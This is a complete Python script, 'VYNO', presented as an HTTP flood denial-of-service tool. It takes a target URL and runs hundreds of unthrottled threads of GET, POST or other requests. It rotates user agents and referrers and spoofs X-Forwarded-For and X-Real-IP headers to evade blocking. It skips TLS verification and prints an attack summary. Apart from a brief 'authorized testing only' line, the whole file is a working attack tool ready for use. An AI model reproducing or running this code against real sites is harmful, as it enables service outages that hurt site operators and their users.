#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# VYNO - HTTP Flood DoS Tool
# INFINITE MODE - NO STOP
# For authorized testing only.

import sys
import time
import threading
import random
import argparse
import urllib.parse
from datetime import datetime

try:
    import requests
    from requests.adapters import HTTPAdapter
    from urllib3.util.retry import Retry
except ImportError:
    print("[ERROR] 'requests' library missing. Install: pip install requests")
    sys.exit(1)

ASCII_LOGO = r"""
 __     __ __   __ _   _  ___  
 \ \   / / \ \ / /| \ | |/ _ \ 
  \ \ / /   \ V / |  \| | | | |
   \ V /     | |  | |\  | |_| |
    \_/      |_|  |_| \_|\___/ 
                                
      VYNO DoS Tool v1.0
      Vibecoded With AI Btw
"""

# Global state
running = True
stats = {
    "sent": 0,
    "success": 0,
    "failed": 0,
    "total_bytes": 0,
    "start": None
}

lock = threading.Lock()

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0"
]

REFERRERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yandex.com/",
    "https://duckduckgo.com/",
    "https://www.facebook.com/",
    "https://twitter.com/",
    "https://www.reddit.com/",
    "https://www.instagram.com/"
]

def banner():
    print(ASCII_LOGO)
    print("=" * 60)
    print("  VYNO - HTTP Flood DoS Tool")
    print("  INFINITE MODE: NO STOPPING")
    print("  WARNING: Use only on systems you own or have permission to test.")
    print("=" * 60)

def get_target():
    while True:
        try:
            target = input("[?] Target site URL (e.g., https://example.com): ").strip()
            if not target:
                print("[!] URL cannot be empty.")
                continue
            if not target.startswith(("http://", "https://")):
                target = "https://" + target
            parsed = urllib.parse.urlparse(target)
            if not parsed.netloc:
                print("[!] Invalid URL.")
                continue
            return target
        except KeyboardInterrupt:
            print("\n[!] Cancelled.")
            sys.exit(0)

def get_thread_count():
    while True:
        try:
            n = input("[?] Thread count (1-1000, default 200): ").strip()
            if not n:
                return 200
            n = int(n)
            if 1 <= n <= 1000:
                return n
            print("[!] Must be between 1 and 1000.")
        except ValueError:
            print("[!] Invalid number.")
        except KeyboardInterrupt:
            print("\n[!] Cancelled.")
            sys.exit(0)

def get_method():
    while True:
        m = input("[?] HTTP method (GET/POST/HEAD/PUT/DELETE/OPTIONS, default GET): ").strip().upper()
        if not m:
            return "GET"
        if m in ("GET", "POST", "HEAD", "PUT", "DELETE", "OPTIONS"):
            return m
        print("[!] Invalid method.")

def make_session():
    session = requests.Session()
    retry = Retry(total=0, backoff_factor=0)
    adapter = HTTPAdapter(max_retries=retry, pool_connections=2000, pool_maxsize=2000)
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    return session

def random_path(length=10):
    chars = "abcdefghijklmnopqrstuvwxyz0123456789"
    return "/" + "".join(random.choice(chars) for _ in range(length))

def worker(target, method, stop_event):
    session = make_session()
    # INFINITE MODE: loop runs until process is killed (stop_event never set)
    while not stop_event.is_set():
        try:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Referer": random.choice(REFERRERS),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9,tr;q=0.8",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Cache-Control": "no-cache",
                "Pragma": "no-cache",
                "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                "X-Real-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            }
            url = target + random_path() if random.random() < 0.5 else target
            start = time.time()
            if method == "GET":
                r = session.get(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
            elif method == "POST":
                payload = {"data": "A" * random.randint(100, 5000)}
                r = session.post(url, headers=headers, data=payload, timeout=5, verify=False, allow_redirects=False)
            elif method == "HEAD":
                r = session.head(url, headers=headers, timeout=5, verify=False, allow_redirects=False)
            else:
                r = session.request(method, url, headers=headers, timeout=5, verify=False, allow_redirects=False)
            elapsed = time.time() - start
            size = len(r.content) if hasattr(r, "content") else 0
            with lock:
                stats["sent"] += 1
                if r.status_code < 500:
                    stats["success"] += 1
                else:
                    stats["failed"] += 1
                stats["total_bytes"] += size
            print(f"[+] {r.status_code} | {elapsed*1000:.0f}ms | {size}B | {url[:80]}")
        except requests.exceptions.RequestException as e:
            with lock:
                stats["sent"] += 1
                stats["failed"] += 1
            print(f"[!] ERROR: {str(e)[:100]}")
        except Exception as e:
            with lock:
                stats["sent"] += 1
                stats["failed"] += 1
            print(f"[!] UNEXPECTED: {str(e)[:100]}")
        # No sleep in infinite mode - maximum throughput
        # Uncomment next line to throttle:
        # time.sleep(random.uniform(0.001, 0.01))

def printer(stop_event):
    last = 0
    while not stop_event.is_set():
        time.sleep(1)
        with lock:
            total = stats["sent"]
            rps = total - last
            last = total
            elapsed = (datetime.now() - stats["start"]).total_seconds() if stats["start"] else 0
            print("\n" + "=" * 50)
            print(f"[STATUS] Elapsed: {elapsed:.0f}s | Total: {total} | RPS: {rps}")
            print(f"[STATUS] Success: {stats['success']} | Failed: {stats['failed']}")
            print(f"[STATUS] Total Data: {stats['total_bytes']/1024:.1f} KB")
            print("=" * 50 + "\n")

def main():
    banner()
    target = get_target()
    threads = get_thread_count()
    method = get_method()

    print(f"\n[+] Target: {target}")
    print(f"[+] Threads: {threads}")
    print(f"[+] Mode: INFINITE (no stop)")
    print(f"[+] Method: {method}")
    print("[+] Starting... Press Ctrl+C to force stop.\n")

    # Disable SSL warnings
    import urllib3
    urllib3.disable_warnings()

    stats["start"] = datetime.now()
    # stop_event is NEVER set -> infinite mode
    stop_event = threading.Event()

    # Worker threads
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=worker, args=(target, method, stop_event), daemon=True)
        t.start()
        thread_list.append(t)

    # Printer thread
    p = threading.Thread(target=printer, args=(stop_event,), daemon=True)
    p.start()

    # INFINITE MODE: main thread never exits unless KeyboardInterrupt
    try:
        while not stop_event.is_set():
            time.sleep(1)
    except KeyboardInterrupt:
        print("\n[!] Force stop requested. Shutting down...")
        stop_event.set()

    # Wait for threads to finish
    for t in thread_list:
        t.join(timeout=2)
    p.join(timeout=2)

    # Summary
    elapsed = (datetime.now() - stats["start"]).total_seconds()
    print("\n" + "=" * 60)
    print("  ATTACK SUMMARY")
    print("=" * 60)
    print(f"  Target          : {target}")
    print(f"  Total Requests  : {stats['sent']}")
    print(f"  Successful      : {stats['success']}")
    print(f"  Failed          : {stats['failed']}")
    print(f"  Total Data      : {stats['total_bytes']/1024:.2f} KB")
    print(f"  Elapsed         : {elapsed:.1f} seconds")
    print(f"  Average RPS     : {stats['sent']/elapsed if elapsed > 0 else 0:.1f}")
    print("=" * 60)
    print("  VYNO - Process terminated.")
    print("=" * 60)

if __name__ == "__main__":
    main()
